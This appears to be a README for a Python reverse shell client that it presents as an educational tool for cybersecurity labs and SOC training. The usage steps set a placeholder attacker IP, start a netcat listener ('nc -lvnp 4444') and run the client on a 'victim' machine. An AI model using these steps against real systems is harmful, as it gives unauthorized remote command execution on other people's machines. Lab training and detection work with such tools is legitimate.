# Reverse-Shell-Client
Python-based reverse shell client script for controlled cybersecurity environments and ethical testing.


# 🐍 Python Reverse Shell Client

This is a Python-based reverse shell client designed for educational use in cybersecurity labs, penetration testing environments, and SOC training setups.

> ⚠️ **Disclaimer:** This code is meant strictly for educational and ethical use in authorized environments only.

## ⚙️ How It Works

- Connects to a remote host using IP & port
- Receives and executes shell commands
- Sends back output to the server

## 🚀 Usage

1. Set the attacker's IP in `VictomC2.py`:
   ```python
   attacker_ip = "YOUR.IP.HERE"
2. Start Listener
On the attacker's machine:

bash
Copy
Edit
nc -lvnp 4444
3. Launch Client
Run the script on the victim machine:

bash
Copy
Edit
python3 VictomC2.py
🎓 Learning Use Cases
💼 SOC Analyst training

🔍 SIEM-based detection (e.g., ELK Stack)

🧠 Understanding remote command execution

⚔️ Ethical hacking labs

